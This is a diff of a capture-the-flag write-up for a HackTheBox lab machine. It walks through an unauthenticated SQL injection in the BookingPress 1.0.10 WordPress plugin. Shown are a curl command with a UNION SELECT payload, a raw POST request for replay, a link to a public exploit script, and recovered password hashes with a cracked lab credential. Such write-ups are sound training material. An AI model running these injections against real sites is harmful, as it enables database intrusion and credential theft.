@@ -36,16 +36,29 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 when entering the /events folder you can see that the page is using some sort of booking form to book an appointment, when entering the source code you can see that the booking form is called BookPress and it's version is `<link rel='stylesheet' id='bookingpress_element_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10' media='all' />` as you can see the ?ver parameter is the equal to 1.0.10 var(short for version).
 When searching on the web `BookingPress 1.0.10 exploit` you can come across a website that explains about an Unauthenticated SQL injection.
 https://vulners.com/wpvulndb/WPVDB-ID:388CD42D-B61A-42A4-8604-99B812DB2357
-<bold>Description</bold>
+
+
+<strong>Description</strong>
+
+
 The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection
 
 Now you can run an curl command that requests the sqli to that ajax.php file aopen a nd burp will intercept it if you'll proxy.
-The command: `curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080`
+The command:
+
+```
+
+$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080
+
+```
+
 by running this commad burp will intercept it and you could run the sql injection from the repeater.
 Now copy the request to a file delete the injection code that means every thing till the `total_service` parameter and match to 1.
 
 the request file needs to look something like this:
+
 ```
+
 POST /wp-admin/admin-ajax.php HTTP/1.1
 Host: metapress.htb
 User-Agent: curl/7.85.0
@@ -55,11 +68,14 @@ Content-Type: application/x-www-form-urlencoded
 Connection: close
 
 action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1  
+
 ```
+
 Now you want to replace the `_wpnonce=8487be48f4` I found it be searching in the source file of events for bookingpress_front_get_category_services if I wouldn't find nothing I'd just go and search for another parameter to see that everything is where it sposed to be and equal to what it's sposed to equal.
 Note: Now I don't know if you all had the same problam as me so, for some reason every other word was with a semi column so erase the semi columns and run it and it will word.
 
-Now I found a funcky little program that does the work for you - https://github.com/Chris01s/CVE-2022-0739/blob/main/exploit.sh 
+Now I found a funcky little program that does the work for you - (https://github.com/Chris01s/CVE-2022-0739/blob/main/exploit.sh) 
+
 just enter the url of /events and it will do the rest, now for me the program didn't work the best but it deliverd that's for sure. 
 
 [+] Getting creds...                                                                                                       
@@ -69,7 +85,9 @@ admin $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
 manager $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70  
 
 ```
+
 manager:partylikearockstar
+
 
 ### WordPress Authenticated Blind XXE Vulnerability 
 
